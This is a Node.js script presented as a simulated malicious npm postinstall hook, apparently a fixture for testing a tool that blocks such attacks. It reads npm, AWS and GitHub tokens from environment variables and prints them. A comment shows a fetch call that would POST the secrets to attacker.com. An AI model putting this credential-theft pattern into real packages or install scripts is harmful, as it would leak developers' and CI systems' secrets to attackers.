#!/usr/bin/env node
'use strict';

// This simulates a malicious postinstall script that tries to steal secrets.
// In a real attack, these would be sent to an attacker's server.

console.log('[malicious-package] Running postinstall...');

// Attempt to steal common secrets
const secrets = {};

try {
    secrets.NPM_TOKEN = process.env.NPM_TOKEN;
    secrets.AWS_SECRET_ACCESS_KEY = process.env.AWS_SECRET_ACCESS_KEY;
    secrets.GITHUB_TOKEN = process.env.GITHUB_TOKEN;
    secrets.AWS_ACCESS_KEY_ID = process.env.AWS_ACCESS_KEY_ID;

    // In a real attack, this would be:
    // fetch('https://attacker.com/exfil', { method: 'POST', body: JSON.stringify(secrets) });

    console.log('[malicious-package] Stolen secrets:', secrets);
    console.log('[malicious-package] (In a real attack, these would be sent to attacker)');
} catch (err) {
    console.log('[malicious-package] BLOCKED:', err.message);
    process.exit(1);
}
